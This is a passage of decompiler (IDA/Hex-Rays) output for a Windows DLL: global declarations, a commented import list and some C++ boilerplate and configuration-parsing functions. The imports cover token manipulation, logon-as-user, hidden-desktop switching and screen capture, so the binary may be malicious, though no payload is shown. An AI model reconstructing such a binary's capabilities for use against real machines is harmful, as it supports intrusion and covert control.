int dword_10092390 = 0; // weak
int dword_100923F8 = 0; // weak
int dword_100923FC = 0; // weak
int dword_10092400 = 0; // weak
int (__stdcall *dword_10092404)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_10092408)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_1009240C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_10092410)(_DWORD) = NULL; // weak
int (__cdecl *dword_10092414)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__thiscall **off_10092418)(void *Block, char) = &off_10072C08; // weak
int dword_1009241C = 0; // weak
int (__thiscall **off_10092420)(void *Block, char) = &off_100731E8; // weak
int dword_10092424 = 0; // weak
int (__thiscall **off_10092428)(void *Block, char) = &off_10073870; // weak
int dword_1009242C = 0; // weak
int (__thiscall **off_10092434)(void *Block, char) = &off_10074A98; // weak
int dword_10092438 = 0; // weak
int dword_10092450 = 1024; // weak
int dword_10092454 = -1023; // weak
int dword_10092458 = 53; // weak
int dword_1009245C = 11; // weak
int dword_10092460 = 64; // weak
int dword_10092464 = 1023; // weak
int dword_10092468 = 128; // weak
int dword_1009246C = -127; // weak
int dword_10092470 = 24; // weak
int dword_10092474 = 8; // weak
int dword_10092478 = 32; // weak
int dword_1009247C = 127; // weak
// extern LSTATUS (__stdcall *RegCreateKeyExW)(HKEY hKey, LPCWSTR lpSubKey, DWORD Reserved, LPWSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
// extern BOOL (__stdcall *LookupAccountSidW)(LPCWSTR lpSystemName, PSID Sid, LPWSTR Name, LPDWORD cchName, LPWSTR ReferencedDomainName, LPDWORD cchReferencedDomainName, PSID_NAME_USE peUse);
// extern BOOL (__stdcall *RevertToSelf)();
// extern BOOL (__stdcall *AdjustTokenPrivileges)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
// extern BOOL (__stdcall *LookupPrivilegeValueW)(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);
// extern BOOL (__stdcall *GetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// extern BOOL (__stdcall *LogonUserW)(LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken);
// extern BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// extern LSTATUS (__stdcall *RegEnumKeyExW)(HKEY hKey, DWORD dwIndex, LPWSTR lpName, LPDWORD lpcchName, LPDWORD lpReserved, LPWSTR lpClass, LPDWORD lpcchClass, PFILETIME lpftLastWriteTime);
// extern LSTATUS (__stdcall *RegEnumValueW)(HKEY hKey, DWORD dwIndex, LPWSTR lpValueName, LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern LSTATUS (__stdcall *RegOpenCurrentUser)(REGSAM samDesired, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegSetValueExW)(HKEY hKey, LPCWSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern LSTATUS (__stdcall *RegDeleteValueW)(HKEY hKey, LPCWSTR lpValueName);
// extern LSTATUS (__stdcall *RegQueryInfoKeyA)(HKEY hKey, LPSTR lpClass, LPDWORD lpcchClass, LPDWORD lpReserved, LPDWORD lpcSubKeys, LPDWORD lpcbMaxSubKeyLen, LPDWORD lpcbMaxClassLen, LPDWORD lpcValues, LPDWORD lpcbMaxValueNameLen, LPDWORD lpcbMaxValueLen, LPDWORD lpcbSecurityDescriptor, PFILETIME lpftLastWriteTime);
// extern LSTATUS (__stdcall *RegDeleteKeyW)(HKEY hKey, LPCWSTR lpSubKey);
// extern DWORD (__stdcall *SetNamedSecurityInfoW)(LPWSTR pObjectName, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID psidOwner, PSID psidGroup, PACL pDacl, PACL pSacl);
// extern BOOL (__stdcall *GetSecurityDescriptorSacl)(PSECURITY_DESCRIPTOR pSecurityDescriptor, LPBOOL lpbSaclPresent, PACL *pSacl, LPBOOL lpbSaclDefaulted);
// extern BOOL (__stdcall *CreateProcessAsUserW)(HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern LSTATUS (__stdcall *RegOpenKeyExW)(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegQueryValueExW)(HKEY hKey, LPCWSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern BOOL (__stdcall *OpenThreadToken)(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
// extern int (__stdcall *GetDIBits)(HDC hdc, HBITMAP hbm, UINT start, UINT cLines, LPVOID lpvBits, LPBITMAPINFO lpbmi, UINT usage);
// extern BOOL (__stdcall *DeleteObject)(HGDIOBJ ho);
// extern BOOL (__stdcall *DeleteDC)(HDC hdc);
// extern HGDIOBJ (__stdcall *SelectObject)(HDC hdc, HGDIOBJ h);
// extern BOOL (__stdcall *BitBlt)(HDC hdc, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop);
// extern HBITMAP (__stdcall *CreateCompatibleBitmap)(HDC hdc, int cx, int cy);
// extern HDC (__stdcall *CreateCompatibleDC)(HDC hdc);
// extern int (__stdcall *GetObjectA)(HANDLE h, int c, LPVOID pv);
// extern int (*wnsprintfW)(PWSTR pszDest, int cchDest, PCWSTR pszFmt, ...);
// extern BOOL (__stdcall *PathStripToRootW)(LPWSTR pszPath);
// extern BOOL (__stdcall *SystemParametersInfoA)(UINT uiAction, UINT uiParam, PVOID pvParam, UINT fWinIni);
// extern BOOL (__stdcall *GetWindowRect)(HWND hWnd, LPRECT lpRect);
// extern BOOL (__stdcall *GetClientRect)(HWND hWnd, LPRECT lpRect);
// extern HDC (__stdcall *GetDC)(HWND hWnd);
// extern DWORD (__stdcall *GetWindowThreadProcessId)(HWND hWnd, LPDWORD lpdwProcessId);
// extern int (__stdcall *GetClassNameW)(HWND hWnd, LPWSTR lpClassName, int nMaxCount);
// extern LRESULT (__stdcall *SendMessageTimeoutW)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam, UINT fuFlags, UINT uTimeout, PDWORD_PTR lpdwResult);
// extern BOOL (__stdcall *IsWindowVisible)(HWND hWnd);
// extern HWINSTA (__stdcall *GetProcessWindowStation)();
// extern int (__stdcall *ReleaseDC)(HWND hWnd, HDC hDC);
// extern BOOL (__stdcall *EnumChildWindows)(HWND hWndParent, WNDENUMPROC lpEnumFunc, LPARAM lParam);
// extern BOOL (__stdcall *EnumDesktopsA)(HWINSTA hwinsta, DESKTOPENUMPROCA lpEnumFunc, LPARAM lParam);
// extern HDESK (__stdcall *OpenDesktopA)(LPCSTR lpszDesktop, DWORD dwFlags, BOOL fInherit, ACCESS_MASK dwDesiredAccess);
// extern HDESK (__stdcall *GetThreadDesktop)(DWORD dwThreadId);
// extern BOOL (__stdcall *CloseDesktop)(HDESK hDesktop);
// extern BOOL (__stdcall *SetThreadDesktop)(HDESK hDesktop);
// extern BOOL (__stdcall *GetWindowInfo)(HWND hwnd, PWINDOWINFO pwi);
// extern int (__stdcall *GetDlgCtrlID)(HWND hWnd);
// extern HWND (__stdcall *GetDesktopWindow)();
// extern HWND (__stdcall *WindowFromDC)(HDC hDC);
// extern BOOL (__stdcall *EnumDesktopWindows)(HDESK hDesktop, WNDENUMPROC lpfn, LPARAM lParam);
// extern BOOL (__stdcall *PostThreadMessageA)(DWORD idThread, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern BOOL (__stdcall *DestroyEnvironmentBlock)(LPVOID lpEnvironment);
// extern BOOL (__stdcall *CreateEnvironmentBlock)(LPVOID *lpEnvironment, HANDLE hToken, BOOL bInherit);
// extern BOOL (__stdcall *FindCloseUrlCache)(HANDLE hEnumHandle);
// extern HRESULT (__stdcall *CoInitializeEx)(LPVOID pvReserved, DWORD dwCoInit);
// extern void (__stdcall *CoUninitialize)();
// extern HRESULT (__stdcall *CoCreateInstance)(const IID *const rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, const IID *const riid, LPVOID *ppv);
int dword_10092898 = 0; // weak
int (__stdcall *dword_1009289C)(_DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_100928A0)(_DWORD, _DWORD) = NULL; // weak
_UNKNOWN dword_100928A4; // weak
int dword_100928C8 = 0; // weak
int dword_100928E4 = 0; // weak
int dword_100928F0 = 0; // weak
int dword_10092C4C = 0; // weak
int dword_10092D68 = 0; // weak
int dword_1009323C; // weak
LONG Target; // idb
int dword_1009324C; // weak
int dword_1009328C; // weak
int dword_10093290; // weak
int dword_10093294; // weak
int dword_10093298; // weak
int dword_1009329C; // weak
int dword_10093390; // weak
int dword_10093394; // weak
int dword_10093398; // weak
int dword_1009339C; // weak
int dword_100933A0; // weak
int dword_100933A4; // weak
int dword_100933A8; // weak
int dword_100933AC; // weak
char byte_100933B0; // weak
char byte_100933B1; // weak
char byte_100933B2; // weak
char byte_100933B3; // weak
void *Block; // idb
int dword_100933B8; // weak
int dword_100933BC; // weak
int dword_100933C0; // weak
int dword_100933C4; // weak
char byte_100933C8[256]; // weak
_UNKNOWN unk_100934C8; // weak
int dword_10094148; // weak
int dword_1009414C; // weak
char byte_10094150[]; // weak
char byte_10094152[]; // weak
char byte_10094153; // weak
char byte_10094154[256]; // weak
int dword_10094254; // weak
char byte_10094258[]; // weak
char byte_10094259; // weak
_UNKNOWN unk_1009425A; // weak
_UNKNOWN unk_10094263; // weak
int dword_10094358; // weak
int dword_1009435C; // weak
_UNKNOWN unk_10094360; // weak
int dword_10094F60; // weak
_UNKNOWN unk_10094F64; // weak
char byte_10094F67[]; // weak
char byte_10094F68[40]; // weak
int dword_10094F90; // weak
char byte_10094F97[]; // weak
unsigned __int8 byte_10094F98[128]; // weak
char byte_10095018; // weak
_DWORD dword_1009501C[2]; // weak
_DWORD dword_10095024[2]; // weak
_DWORD dword_1009502C[2]; // weak
_DWORD dword_10095034[2]; // weak
_DWORD dword_1009503C[2]; // weak
int dword_10095044[3]; // weak
_DWORD dword_10095050[2]; // weak
int dword_10095058; // weak
_DWORD dword_1009505C[2]; // weak
int dword_10095064; // weak
_DWORD dword_10095068[4]; // weak
_DWORD dword_10095078[4]; // weak
_DWORD dword_10095088[4]; // weak
_DWORD dword_10095098[4]; // weak
_DWORD dword_100950A8[4]; // weak
_DWORD dword_100950B8[4]; // weak
_DWORD dword_100950C8[4]; // weak
_DWORD dword_100950D8[2]; // weak
_DWORD dword_100950E0[2]; // weak
_DWORD dword_100950E8[2]; // weak
_DWORD dword_100950F0[2]; // weak
_DWORD dword_100950F8[2]; // weak
_DWORD dword_10095100[2]; // weak
_DWORD dword_10095108[2]; // weak
_DWORD dword_10095110[2]; // weak
_DWORD dword_10095118[2]; // weak
_DWORD dword_10095120[2]; // weak
_DWORD dword_10095128[2]; // weak
_DWORD dword_10095130[2]; // weak
_DWORD dword_10095138[2]; // weak
_DWORD dword_10095140[2]; // weak
_DWORD dword_10095148[2]; // weak
_DWORD dword_10095150[2]; // weak
_DWORD dword_10095158[2]; // weak
_DWORD dword_10095160[2]; // weak
_DWORD dword_10095168[2]; // weak
_DWORD dword_10095170[2]; // weak
_DWORD dword_10095178[2]; // weak
_DWORD dword_10095180[2]; // weak
_DWORD dword_10095188[2]; // weak
_DWORD dword_10095190[2]; // weak
_DWORD dword_10095198[2]; // weak
_DWORD dword_100951A0[2]; // weak
_DWORD dword_100951A8[2]; // weak
_DWORD dword_100951B0[2]; // weak
_DWORD dword_100951B8[2]; // weak
_DWORD dword_100951C0[2]; // weak
_DWORD dword_100951C8[2]; // weak
_DWORD dword_100951D0[2]; // weak
_DWORD dword_100951D8[2]; // weak
_DWORD dword_100951E0[2]; // weak
_DWORD dword_100951E8[2]; // weak
_DWORD dword_100951F0[2]; // weak
_DWORD dword_100951F8[2]; // weak
_DWORD dword_10095200[2]; // weak
_DWORD dword_10095208[2]; // weak
_DWORD dword_10095210[2]; // weak
_DWORD dword_10095218[2]; // weak
_DWORD dword_10095220[2]; // weak
_DWORD dword_10095228[2]; // weak
_DWORD dword_10095230[2]; // weak
_DWORD dword_10095238[2]; // weak
_DWORD dword_10095240[2]; // weak
_DWORD dword_10095248[2]; // weak
_DWORD dword_10095250[2]; // weak
_DWORD dword_10095258[2]; // weak
_DWORD dword_10095260[2]; // weak
_DWORD dword_10095268[2]; // weak
_DWORD dword_10095270[2]; // weak
_DWORD dword_10095278[2]; // weak
_DWORD dword_10095280[2]; // weak
_DWORD dword_10095288[2]; // weak
_DWORD dword_10095290[2]; // weak
_DWORD dword_10095298[2]; // weak
_DWORD dword_100952A0[2]; // weak
_DWORD dword_100952A8[2]; // weak
_DWORD dword_100952B0[2]; // weak
_DWORD dword_100952B8[2]; // weak
_DWORD dword_100952C0[2]; // weak
_DWORD dword_100952C8[2]; // weak
_DWORD dword_100952D0[2]; // weak
_DWORD dword_100952D8[2]; // weak
_DWORD dword_100952E0[2]; // weak
_DWORD dword_100952E8[2]; // weak
_DWORD dword_100952F0[2]; // weak
_DWORD dword_100952F8[2]; // weak
_DWORD dword_10095300[2]; // weak
_DWORD dword_10095308[2]; // weak
_DWORD dword_10095310[2]; // weak
_DWORD dword_10095318[2]; // weak
_DWORD dword_10095320[2]; // weak
_DWORD dword_10095328[2]; // weak
_DWORD dword_10095330[2]; // weak
_DWORD dword_10095338[2]; // weak
_DWORD dword_10095340[2]; // weak
_DWORD dword_10095348[2]; // weak
_DWORD dword_10095350[2]; // weak
_DWORD dword_10095358[2]; // weak
_DWORD dword_10095360[2]; // weak
_DWORD dword_10095368[2]; // weak
_DWORD dword_10095370[2]; // weak
_DWORD dword_10095378[2]; // weak
_DWORD dword_10095380[2]; // weak
_DWORD dword_10095388[2]; // weak
_DWORD dword_10095390[2]; // weak
_DWORD dword_10095398[2]; // weak
_DWORD dword_100953A0[2]; // weak
_DWORD dword_100953A8[2]; // weak
_DWORD dword_100953B0[2]; // weak
_DWORD dword_100953B8[2]; // weak
_DWORD dword_100953C0[2]; // weak
_DWORD dword_100953C8[2]; // weak
_DWORD dword_100953D0[2]; // weak
_DWORD dword_100953D8[2]; // weak
_DWORD dword_100953E0[2]; // weak
_DWORD dword_100953E8[2]; // weak
_DWORD dword_100953F0[2]; // weak
_DWORD dword_100953F8[2]; // weak
_DWORD dword_10095400[2]; // weak
_DWORD dword_10095408[2]; // weak
_DWORD dword_10095410[2]; // weak
_DWORD dword_10095418[2]; // weak
int dword_10095420[3]; // weak
_DWORD dword_1009542C[2]; // weak
_DWORD dword_10095434[2]; // weak
_DWORD dword_1009543C[2]; // weak
_DWORD dword_10095444[2]; // weak
int dword_1009544C[3]; // weak
_DWORD dword_10095458[2]; // weak
_DWORD dword_10095460[2]; // weak
int dword_10095468[3]; // weak
int dword_10095474; // weak
int dword_1009547C[5]; // weak
int dword_10095490; // weak
int dword_10095494[3]; // weak
int dword_100954A0; // weak
int dword_100954A8[5]; // weak
int dword_100954BC; // weak
int dword_100954C0; // weak
int dword_100954C4; // weak
int dword_100954C8; // weak
int dword_100954CC; // weak
int dword_100954D0; // weak
int dword_100954D8[4]; // weak
_DWORD dword_100954E8[2]; // weak
_DWORD dword_100954F0[2]; // weak
int dword_100954F8[3]; // weak
_DWORD dword_10095504[2]; // weak
_DWORD dword_1009550C[2]; // weak
_DWORD dword_10095514[2]; // weak
_DWORD dword_1009551C[2]; // weak
_DWORD dword_10095524; // weak
DWORD dwTlsIndex; // idb
_DWORD dword_1009552C[2]; // weak
_DWORD dword_10095534[2]; // weak
_DWORD dword_1009553C[2]; // weak
_DWORD dword_10095544[2]; // weak
int dword_1009554C; // weak
int dword_10095550; // weak
int dword_10095554; // weak
int dword_10095558; // weak
int dword_1009555C; // weak
int dword_10095564; // weak
_DWORD dword_1009556C[2]; // weak
_DWORD dword_10095574[2]; // weak
LONG Addend; // idb
_DWORD dword_10095580[2]; // weak
_DWORD dword_10095588[2]; // weak
_DWORD dword_10095590[2]; // weak
_DWORD dword_10095598[2]; // weak
_DWORD dword_100955A0[2]; // weak
_DWORD dword_100955A8[2]; // weak
int dword_100955B0; // weak
int dword_100955B4; // weak
_DWORD dword_100955B8[2]; // weak
_DWORD dword_100955C0[2]; // weak
_DWORD dword_100955C8[2]; // weak
_DWORD dword_100955D0[2]; // weak
_DWORD dword_100955D8[2]; // weak
_DWORD dword_100955E0[2]; // weak
_DWORD dword_100955E8[2]; // weak
_DWORD dword_100955F0[2]; // weak
_DWORD dword_100955F8[2]; // weak
_DWORD dword_10095600[2]; // weak
_DWORD dword_10095608[2]; // weak
_DWORD dword_10095610; // weak
DWORD dword_10095614; // idb
_DWORD dword_10095618[2]; // weak
_DWORD dword_10095620[2]; // weak
_DWORD dword_10095628[2]; // weak
_DWORD dword_10095630[2]; // weak
_DWORD dword_10095638[2]; // weak
int dword_10095640[]; // weak
int dword_10095644[]; // weak
int dword_10095648; // weak
int dword_10095768; // weak
int dword_1009576C; // weak
_UNKNOWN unk_10095770; // weak
_DWORD dword_10095774[2]; // weak
_DWORD dword_1009577C[2]; // weak
_DWORD dword_10095784[2]; // weak
int dword_1009578C; // weak
int dword_10095790; // weak
int dword_10095794; // weak
int dword_10095798; // weak
int dword_1009579C; // weak
int dword_100957A0; // weak
int dword_100957A4; // weak
int dword_100957A8; // weak
_DWORD dword_100957AC[2]; // weak
int dword_100957B4[9]; // weak
int dword_100957D8[9]; // weak
int dword_100957FC[9]; // weak
_DWORD dword_10095820[3]; // weak
int dword_1009582C[9]; // weak
int dword_10096864; // weak
int dword_10096890; // weak


//----- (10001000) --------------------------------------------------------
_DWORD *__usercall sub_10001000@<eax>(_DWORD *result@<eax>)
{
  *result = off_10072944;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);

//----- (1000102C) --------------------------------------------------------
_DWORD *__stdcall sub_1000102C(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_10072A1C;
  return a1;
}
// 10072A1C: using guessed type int (__thiscall *off_10072A1C)(void *Block, char);

//----- (10001060) --------------------------------------------------------
void __thiscall sub_10001060(_DWORD *this)
{
  *this = &off_10072A1C;
  sub_1000DF1A(this);
}
// 10072A1C: using guessed type int (__thiscall *off_10072A1C)(void *Block, char);

//----- (10001089) --------------------------------------------------------
_DWORD *__thiscall sub_10001089(_DWORD *Block, char a2)
{
  sub_10001060(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100010A5) --------------------------------------------------------
void __stdcall sub_100010A5(int *a1)
{
  sub_100022C5(a1 + 30);
  sub_100022C5(a1 + 26);
  sub_100022C5(a1 + 22);
  sub_100022C5(a1 + 18);
  sub_100022C5(a1 + 14);
  sub_100022C5(a1 + 10);
  sub_100022C5(a1 + 6);
  sub_10009F65(a1 + 3);
  sub_10009F65(a1);
}

//----- (10001130) --------------------------------------------------------
int __stdcall sub_10001130(int a1, int a2, int a3)
{
  sub_10001177(dword_10095050, (_DWORD *)a1);
  *(_BYTE *)(a1 + 136) = 0;
  sub_10009F65(&a2);
  return a1;
}
// 10095050: using guessed type _DWORD dword_10095050[2];

//----- (10001177) --------------------------------------------------------
_DWORD *__userpurge sub_10001177@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  sub_10009F32(a2, (int)a1);
  a2[2] = a1[2];
  sub_10009F32(a2 + 3, (int)(a1 + 3));
  a2[5] = a1[5];
  sub_100021D4(a1 + 6, a2 + 6);
  sub_100021D4(a1 + 10, a2 + 10);
  sub_100021D4(a1 + 14, a2 + 14);
  sub_100021D4(a1 + 18, a2 + 18);
  sub_100021D4(a1 + 22, a2 + 22);
  sub_100021D4(a1 + 26, a2 + 26);
  sub_100021D4(a1 + 30, a2 + 30);
  return a2;
}

//----- (10001230) --------------------------------------------------------
int __stdcall sub_10001230(int a1, int a2, int a3, int a4, int a5, int a6)
{
  return sub_10001234(a1, a2, a3, a4, a5, a6);
}
// 10001234: using guessed type int __stdcall sub_10001234(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (10001234) --------------------------------------------------------
LONG __userpurge sub_10001234@<eax>(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        void *Block,
        int a18,
        int a19,
        void *a20,
        int a21,
        int a22,
        int a23,
        void *a24)
{
  _DWORD *v24; // eax
  int v25; // eax
  void *v26; // ecx
  void *v27; // eax
  int v28; // ebx
  _DWORD *v29; // eax
  int v30; // eax
  _DWORD *v31; // eax
  _DWORD *v32; // eax
  int v33; // esi
  int v34; // eax
  _DWORD *v35; // ebx
  int v36; // eax
  int v37; // ecx
  int v38; // ecx
  int v39; // ecx
  int v40; // ecx
  int v41; // ecx
  int v42; // ecx
  int v43; // ecx
  int v44; // ecx
  int v45; // ecx
  int v46; // ecx
  int v47; // ecx
  int v48; // ecx
  int v49; // ecx
  int v50; // ecx
  int v52; // [esp-34h] [ebp-234h] BYREF
  int v53; // [esp-30h] [ebp-230h]
  int v54; // [esp-2Ch] [ebp-22Ch] BYREF
  int v55; // [esp-28h] [ebp-228h]
  _DWORD *v56; // [esp-24h] [ebp-224h]
  int v57; // [esp-8h] [ebp-208h] BYREF
  void *v58; // [esp-4h] [ebp-204h]
  int v59; // [esp+0h] [ebp-200h] BYREF
  _DWORD v60[71]; // [esp+Ch] [ebp-1F4h] BYREF
  char v61[108]; // [esp+128h] [ebp-D8h] BYREF
  struct _SECURITY_ATTRIBUTES v62[4]; // [esp+194h] [ebp-6Ch] BYREF
  int v63[5]; // [esp+1C4h] [ebp-3Ch] BYREF
  char v64[24]; // [esp+1D8h] [ebp-28h] BYREF
  int *v65; // [esp+1F0h] [ebp-10h]
  int v66; // [esp+1FCh] [ebp-4h]
  char vars0; // [esp+200h] [ebp+0h] BYREF

  v65 = &v59;
  v66 = 1;
  v24 = sub_1000BA21(&a14, (int)&unk_100950F0);
  LOBYTE(v66) = 2;
  v25 = sub_1000BB4C((int)v24);
  v58 = v26;
  v57 = (int)v26;
  Block = &v57;
  sub_10009F32(&v57, v25);
  LOBYTE(v66) = 2;
  sub_1000ED1A((int)&vars0, v57, (int)v58);
  LOBYTE(v66) = 5;
  sub_1000BA51(&a14);
  v58 = a24;
  v27 = (void *)sub_1000C52E(&a21);
  sub_1000E599(v60, v27, v58);
  LOBYTE(v66) = 6;
  sub_1000E72D((int)v61, (int)&vars0, (int)v60);
  LOBYTE(v66) = 7;
  sub_1000C28D(0, (int)&a4, 0);
  LOBYTE(v66) = 8;
  sub_1000C28D((void *)0x400, (int)&a9, 0);
  LOBYTE(v66) = 9;
  do
  {
    v28 = sub_1000E8CB((int)v61, (int)&a9);
    v29 = (_DWORD *)sub_1000C709(v28, &a9, (int)v63, 0);
    LOBYTE(v66) = 10;
    sub_1000C5DF(v29, (int)&a4);
    LOBYTE(v66) = 9;
    sub_1000C45D(v63);
  }
  while ( v28 );
  sub_10003686((int)v64, &a4);
  LOBYTE(v66) = 11;
  sub_1000BEC2(v62, (int)v64);
  LOBYTE(v66) = 12;
  v30 = sub_1000BF21((int)v62);
  (*(void (__thiscall **)(int, _DWORD, _DWORD))(*(_DWORD *)v30 + 8))(v30, 0, 0);
  v31 = operator new(0x60u);
  Block = v31;
  LOBYTE(v66) = 13;
  if ( v31 )
    v32 = sub_1000C92B(v62, v31);
  else
    v32 = 0;
  LOBYTE(v66) = 12;
  sub_100028DE(&a14, (int)v32);
  LOBYTE(v66) = 14;
  v33 = a14;
  v34 = (*(int (__thiscall **)(int, int *, void *))(*(_DWORD *)a14 + 76))(a14, &a16, &unk_10095100);
  LOBYTE(v66) = 15;
  v35 = a20;
  sub_100021B1((int *)(v34 + 4), (int *)a20 + 1);
  LOBYTE(v66) = 14;
  sub_10009F65(&a16);
  v35[2] = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v33 + 64))(v33, &unk_10095034);
  v36 = (*(int (__thiscall **)(int, int *, void *))(*(_DWORD *)v33 + 76))(v33, &a16, &unk_100950E0);
  LOBYTE(v66) = 16;
  sub_100021B1((int *)(v36 + 4), v35 + 4);
  LOBYTE(v66) = 14;
  sub_10009F65(&a16);
  v35[5] = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v33 + 64))(v33, &unk_100950E8);
  v56 = v35 + 6;
  v55 = v37;
  v54 = v37;
  a20 = &v54;
  sub_10009F32(&v54, (int)&unk_10095108);
  LOBYTE(v66) = 17;
  v53 = v38;
  v52 = v38;
  Block = &v52;
  sub_100028CA(&a14, &v52);
  LOBYTE(v66) = 14;
  sub_10001780(v52, v53, v54, v55, (int)v56);
  v56 = v35 + 10;
  v55 = v39;
  v54 = v39;
  a20 = &v54;
  sub_10009F32(&v54, (int)&unk_100950D8);
  LOBYTE(v66) = 19;
  v53 = v40;
  v52 = v40;
  Block = &v52;
  sub_100028CA(&a14, &v52);
  LOBYTE(v66) = 14;
  sub_10001780(v52, v53, v54, v55, (int)v56);
  v56 = v35 + 14;
  v55 = v41;
  v54 = v41;
  a20 = &v54;
  sub_10009F32(&v54, (int)&unk_1009503C);
  LOBYTE(v66) = 21;
  v53 = v42;
  v52 = v42;
  Block = &v52;
  sub_100028CA(&a14, &v52);
  LOBYTE(v66) = 14;
  sub_10001780(v52, v53, v54, v55, (int)v56);
  v56 = v35 + 18;
  v55 = v43;
  v54 = v43;
  a20 = &v54;
  sub_10009F32(&v54, (int)&unk_1009502C);
  LOBYTE(v66) = 23;
  v53 = v44;
  v52 = v44;
  Block = &v52;
  sub_100028CA(&a14, &v52);
  LOBYTE(v66) = 14;
  sub_10001780(v52, v53, v54, v55, (int)v56);
  v56 = v35 + 22;
  v55 = v45;
  v54 = v45;
  a20 = &v54;
  sub_10009F32(&v54, (int)&unk_10095044);
  LOBYTE(v66) = 25;
  v53 = v46;
  v52 = v46;
  Block = &v52;
  sub_100028CA(&a14, &v52);
  LOBYTE(v66) = 14;
  sub_10001780(v52, v53, v54, v55, (int)v56);
  v56 = v35 + 26;
  v55 = v47;
  v54 = v47;
  a20 = &v54;
  sub_10009F32(&v54, (int)&unk_10095024);
  LOBYTE(v66) = 27;
  v53 = v48;
  v52 = v48;
  Block = &v52;
  sub_100028CA(&a14, &v52);
  LOBYTE(v66) = 14;
  sub_10001780(v52, v53, v54, v55, (int)v56);
  v56 = v35 + 30;
  v55 = v49;
  v54 = v49;
  a20 = &v54;
  sub_10009F32(&v54, (int)&unk_1009501C);
  LOBYTE(v66) = 29;
  v53 = v50;
  v52 = v50;
  Block = &v52;
  sub_100028CA(&a14, &v52);
  LOBYTE(v66) = 14;
  sub_10001780(v52, v53, v54, v55, (int)v56);
  *((_BYTE *)v35 + 136) = 1;
  LOBYTE(v66) = 12;
  sub_10002922(&a14);
  LOBYTE(v66) = 11;
  sub_10001690(v62);
  LOBYTE(v66) = 9;
  sub_1000165B((int)v64);
  LOBYTE(v66) = 8;
  sub_1000C45D(&a9);
  LOBYTE(v66) = 7;
  sub_1000C45D(&a4);
  LOBYTE(v66) = 6;
  sub_1000E823((int)v61);
  LOBYTE(v66) = 5;
  sub_10001624(v60);
  LOBYTE(v66) = 1;
  sub_1000EE45(&vars0);
  v66 = -1;
  return sub_1000C45D(&a21);
}
// 1000126C: variable 'v26' is possibly undefined
// 10001410: variable 'v37' is possibly undefined
// 10001426: variable 'v38' is possibly undefined
// 10001446: variable 'v39' is possibly undefined
// 1000145C: variable 'v40' is possibly undefined
// 1000147C: variable 'v41' is possibly undefined
// 10001492: variable 'v42' is possibly undefined
// 100014B2: variable 'v43' is possibly undefined
// 100014C8: variable 'v44' is possibly undefined
// 100014E8: variable 'v45' is possibly undefined
// 100014FE: variable 'v46' is possibly undefined
// 1000151E: variable 'v47' is possibly undefined
// 10001534: variable 'v48' is possibly undefined
// 10001554: variable 'v49' is possibly undefined
// 1000156A: variable 'v50' is possibly undefined
// 10001234: using guessed type _DWORD var_1F4[71];
// 10001234: using guessed type int var_3C[5];

//----- (10001624) --------------------------------------------------------
void __stdcall sub_10001624(_DWORD *a1)
{
  sub_1000C45D(a1 + 66);
  sub_1000E551(a1);
}

//----- (1000165B) --------------------------------------------------------
void __stdcall sub_1000165B(int a1)
{
  sub_10002891((void *)(a1 + 16));
  sub_10009F65((int *)(a1 + 8));
}

//----- (10001690) --------------------------------------------------------
void __stdcall sub_10001690(_DWORD *a1)
{
  sub_1000E3BE(a1 + 10);
  sub_1000E4C2(a1 + 8);
  sub_10002858(a1 + 4);
  sub_1000281F(a1 + 2);
}

//----- (100016F0) --------------------------------------------------------
